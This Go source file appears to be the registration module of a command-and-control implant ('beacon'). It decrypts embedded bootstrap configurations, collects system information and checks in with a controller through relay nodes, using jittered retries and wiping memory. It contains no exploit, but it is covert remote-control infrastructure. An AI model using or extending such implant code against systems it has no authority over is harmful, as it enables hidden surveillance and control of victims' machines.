package beacon

import (
	"context"
	"io"
	"sync"

	"github.com/pkg/errors"

	"project/internal/bootstrap"
	"project/internal/crypto/aes"
	"project/internal/crypto/curve25519"
	"project/internal/guid"
	"project/internal/logger"
	"project/internal/messages"
	"project/internal/module/info"
	"project/internal/nettool"
	"project/internal/patch/msgpack"
	"project/internal/protocol"
	"project/internal/random"
	"project/internal/security"
	"project/internal/xnet"
	"project/internal/xpanic"
)

type register struct {
	ctx *Beacon

	// about Sleeper.SleepSecond() in Register()
	sleepFixed  uint
	sleepRandom uint

	// key = messages.Bootstrap.Tag
	bootstraps    map[string]bootstrap.Bootstrap
	bootstrapsRWM sync.RWMutex

	// Register() only use the first bootstrap
	first bootstrap.Bootstrap

	context context.Context
	cancel  context.CancelFunc
	wg      sync.WaitGroup
}

func newRegister(ctx *Beacon, config *Config) (*register, error) {
	cfg := config.Register

	if cfg.SleepFixed < 10 {
		return nil, errors.New("register SleepFixed must >= 10")
	}
	if cfg.SleepRandom < 20 {
		return nil, errors.New("register SleepRandom must >= 20")
	}
	if len(cfg.FirstBoot) == 0 {
		return nil, errors.New("no bootstraps")
	}

	memory := security.NewMemory()
	defer memory.Flush()

	register := register{
		ctx:         ctx,
		sleepFixed:  cfg.SleepFixed,
		sleepRandom: cfg.SleepRandom,
		bootstraps:  make(map[string]bootstrap.Bootstrap),
	}
	register.context, register.cancel = context.WithCancel(context.Background())

	// decrypt the first bootstrap
	err := register.loadBootstraps(cfg.FirstBoot, cfg.FirstKey, true)
	if err != nil {
		return nil, err
	}
	// set the first bootstrap(s)
	// if the cfg.FirstBoot contains more than one bootstrap,
	// register will select a bootstrap randomly
	for _, boot := range register.bootstraps {
		register.first = boot
	}

	// decrypt the follow-up bootstraps
	if len(cfg.FollowUpBoots) != 0 {
		err := register.loadBootstraps(cfg.FollowUpBoots, cfg.FollowUpKey, false)
		if err != nil {
			return nil, err
		}
	}
	return &register, nil
}

func (register *register) loadBootstraps(boot, key []byte, single bool) error {
	defer func() {
		security.CoverBytes(boot)
		security.CoverBytes(key)
	}()

	memory := security.NewMemory()
	defer memory.Flush()

	if len(key) != aes.Key256Bit+aes.IVSize {
		return errors.New("invalid aes key size")
	}
	aesKey := key[:aes.Key256Bit]
	aesIV := key[aes.Key256Bit:]
	defer func() {
		security.CoverBytes(aesKey)
		security.CoverBytes(aesIV)
	}()

	// decrypt bootstraps
	memory.Padding()
	data, err := aes.CBCDecrypt(boot, aesKey, aesIV)
	if err != nil {
		return errors.WithStack(err)
	}
	// cover bytes at once
	security.CoverBytes(aesKey)
	security.CoverBytes(aesIV)

	// load bootstraps
	memory.Padding()
	var bootstraps []*messages.Bootstrap
	if single {
		boot := new(messages.Bootstrap)
		err = msgpack.Unmarshal(data, boot)
		if err != nil {
			return errors.WithStack(err)
		}
		bootstraps = []*messages.Bootstrap{boot}
	} else {
		err = msgpack.Unmarshal(data, &bootstraps)
		if err != nil {
			return errors.WithStack(err)
		}
	}
	if len(bootstraps) == 0 {
		return errors.New("no bootstraps")
	}
	for i := 0; i < len(bootstraps); i++ {
		memory.Padding()
		err = register.AddBootstrap(bootstraps[i])
		if err != nil {
			return err
		}
	}
	return nil
}

// func (register *register) logf(lv logger.Level, format string, log ...interface{}) {
// 	register.ctx.logger.Printf(lv, "register", format, log...)
// }

func (register *register) log(lv logger.Level, log ...interface{}) {
	register.ctx.logger.Println(lv, "register", log...)
}

func (register *register) AddBootstrap(b *messages.Bootstrap) error {
	register.bootstrapsRWM.Lock()
	defer register.bootstrapsRWM.Unlock()
	if _, ok := register.bootstraps[b.Tag]; ok {
		return errors.Errorf("bootstrap %s is already exists", b.Tag)
	}
	boot, err := bootstrap.Load(register.context, b.Mode, b.Config,
		register.ctx.global.CertPool,
		register.ctx.global.ProxyPool,
		register.ctx.global.DNSClient,
	)
	if err != nil {
		return errors.Wrapf(err, "failed to load bootstrap %s", b.Tag)
	}
	register.bootstraps[b.Tag] = boot
	return nil
}

func (register *register) DeleteBootstrap(tag string) error {
	register.bootstrapsRWM.Lock()
	defer register.bootstrapsRWM.Unlock()
	if _, ok := register.bootstraps[tag]; ok {
		delete(register.bootstraps, tag)
		return nil
	}
	return errors.Errorf("bootstrap %s is not exist", tag)
}

func (register *register) Bootstraps() map[string]bootstrap.Bootstrap {
	register.bootstrapsRWM.RLock()
	defer register.bootstrapsRWM.RUnlock()
	bs := make(map[string]bootstrap.Bootstrap, len(register.bootstraps))
	for tag, boot := range register.bootstraps {
		bs[tag] = boot
	}
	return bs
}

// Register is used to register to Controller
// <security> only use the first bootstrap
func (register *register) Register() error {
	register.wg.Add(1)
	defer register.wg.Done()

	register.log(logger.Debug, "start register")
	// resolve bootstrap node listeners with the first bootstrap, try 3 times
	var (
		listeners []*bootstrap.Listener
		err       error
	)
	sleeper := random.NewSleeper()
	defer sleeper.Stop()
	for i := 0; i < 3; i++ {
		listeners, err = register.first.Resolve()
		if err == nil {
			break
		}
		register.log(logger.Error, err)
		select {
		case <-sleeper.SleepSecond(register.sleepFixed, register.sleepRandom):
		case <-register.context.Done():
			return register.context.Err()
		}
	}
	if err != nil {
		return errors.WithMessage(err, "failed to resolve bootstrap node listeners")
	}
	// try to register with all resolved bootstrap node listeners,
	// each listener try 3 times
	for _, listener := range listeners {
		for i := 0; i < 3; i++ {
			err = register.register(listener)
			if err == nil {
				register.log(logger.Debug, "register successfully")
				return nil
			}
			register.log(logger.Error, err)
			if i != 2 {
				select {
				case <-sleeper.SleepSecond(register.sleepFixed, register.sleepRandom):
				case <-register.context.Done():
					return register.context.Err()
				}
			}
		}
	}
	return err
}

// packRequest is used to pack beacon register request and encrypt it.
// it is used to register.Register().
//
// self key exchange public key (curve25519),
// use session key encrypt register request data.
// +----------------+----------------+
// | kex public key | encrypted data |
// +----------------+----------------+
// |    32 Bytes    |       var      |
// +----------------+----------------+
func (register *register) packRequest(address string) []byte {
	sleepFixed, sleepRandom := register.ctx.driver.GetSleepTime()
	nrr := messages.BeaconRegisterRequest{
		GUID:         *register.ctx.global.GUID(),
		PublicKey:    register.ctx.global.PublicKey(),
		KexPublicKey: register.ctx.global.KeyExchangePublicKey(),
		ConnAddress:  address,
		SystemInfo:   info.GetSystemInfo(),
		SleepFixed:   sleepFixed,
		SleepRandom:  sleepRandom,
		RequestTime:  register.ctx.global.Now().Local(),
	}
	data, err := msgpack.Marshal(&nrr)
	if err != nil {
		panic("register internal error: " + err.Error())
	}
	defer security.CoverBytes(data)
	cipherData, err := register.ctx.global.Encrypt(data)
	if err != nil {
		panic("register internal error: " + err.Error())
	}
	request := make([]byte, curve25519.ScalarSize)
	copy(request, register.ctx.global.KeyExchangePublicKey())
	return append(request, cipherData...)
}

// register is used to register to Controller with Node.
func (register *register) register(listener *bootstrap.Listener) error {
	client, err := register.ctx.NewClient(
		register.context,
		listener,
		protocol.CtrlGUID,
		nil,
	)
	if err != nil {
		return errors.WithMessage(err, "failed to create client")
	}
	defer client.Close()
	conn := client.Conn
	// interrupt
	wg := sync.WaitGroup{}
	done := make(chan struct{})
	wg.Add(1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				register.log(logger.Fatal, xpanic.Print(r, "register.register"))
			}
			wg.Done()
		}()
		select {
		case <-done:
		case <-register.context.Done():
			_ = conn.Close()
		}
	}()
	defer func() {
		close(done)
		wg.Wait()
	}()
	// send register request
	_, err = conn.Write([]byte{protocol.BeaconOperationRegister})
	if err != nil {
		return errors.Wrap(err, "failed to send register operation")
	}
	// get external IP address
	address, err := conn.Receive()
	if err != nil {
		return errors.Wrap(err, "failed to receive external ip address")
	}
	// send register request
	err = conn.Send(register.packRequest(nettool.DecodeExternalAddress(address)))
	if err != nil {
		return errors.Wrap(err, "failed to send register request")
	}
	// wait register result
	client.SetRandomDeadline(60, 30)
	result := make([]byte, 1)
	_, err = io.ReadFull(conn, result)
	if err != nil {
		return errors.Wrap(err, "failed to receive register result")
	}
	switch result[0] {
	case messages.RegisterResultAccept:
		return register.loadNodeListeners(conn)
	case messages.RegisterResultRefused:
		return errors.WithStack(messages.ErrRegisterRefused)
	case messages.RegisterResultTimeout:
		return errors.WithStack(messages.ErrRegisterTimeout)
	default:
		err = errors.WithMessagef(messages.ErrRegisterUnknownResult, "%d", result[0])
		register.log(logger.Exploit, err)
		return err
	}
}

func (register *register) loadNodeListeners(conn *xnet.Conn) error {
	listenersData, err := conn.Receive()
	if err != nil {
		return errors.Wrap(err, "failed to receive node listeners data")
	}
	listenersData, err = register.ctx.global.Decrypt(listenersData)
	if err != nil {
		return errors.Wrap(err, "failed to decrypt node listeners data")
	}
	defer security.CoverBytes(listenersData)
	rawListeners := make(map[guid.GUID][]*bootstrap.Listener)
	err = msgpack.Unmarshal(listenersData, &rawListeners)
	if err != nil {
		return errors.Wrap(err, "failed to unmarshal node listeners data")
	}
	for nodeGUID, listeners := range rawListeners {
		encListeners := bootstrap.EncryptListeners(listeners)
		for i := 0; i < len(encListeners); i++ {
			register.ctx.driver.AddNodeListener(&nodeGUID, encListeners[i])
		}
	}
	return nil
}

func (register *register) Close() {
	register.cancel()
	register.wg.Wait()
	register.ctx = nil
}
